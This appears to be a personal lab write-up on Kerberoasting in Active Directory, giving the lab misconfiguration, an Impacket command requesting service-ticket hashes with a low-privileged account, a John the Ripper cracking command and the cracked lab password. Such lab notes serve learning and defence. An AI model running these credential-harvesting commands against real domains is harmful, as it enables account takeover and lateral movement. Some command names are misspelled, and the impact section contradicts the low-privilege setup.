# Kerberoasting in Active Directory

## Technique Overview

Kerberoasting is a exploitation technique in which an attacker with a low-privileged domain account requests service tickets (TGS) for service accounts and attempts to crack them offline to recover plaintext credentials.

- **MITRE ATT&CK ID:** [T1558.003 – Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
- **Tools Used:** Rubeus, Mimikatz, Impacket

---

## Lab Misconfiguration

In this lab, a service account ('svc_iis') was:
- Configured with **Service Principal Name (SPN)**: 'HTTP/webserver.mydomain.com'
- Assigned a **weak password**
- Member of the **Domain Users** group only (low-privilege)

This is a **typical enterprise misconfiguration**, where service accounts are not protected or audited properly.

---

##  Exploitation Steps

### 1. Gain Access to a Low-Privileged Account (Lucy)

### 2. Request TGS Hash

```bash
  GetUsersSPNs 'mydomain.com/lucy:<pass>' -request
```
### 3. Crack the Hash Offline

```bash
  john -w:/usr/sahre/wordlist/rockyou.txt hash
```
Password: !giSem@89$gSm

## Impact
Compromising a service account with local admin rights can lead to lateral movement or privilege escalation.

Often overlooked in real environments with hundreds of SPNs.

Easy to automate and scale in large environments.
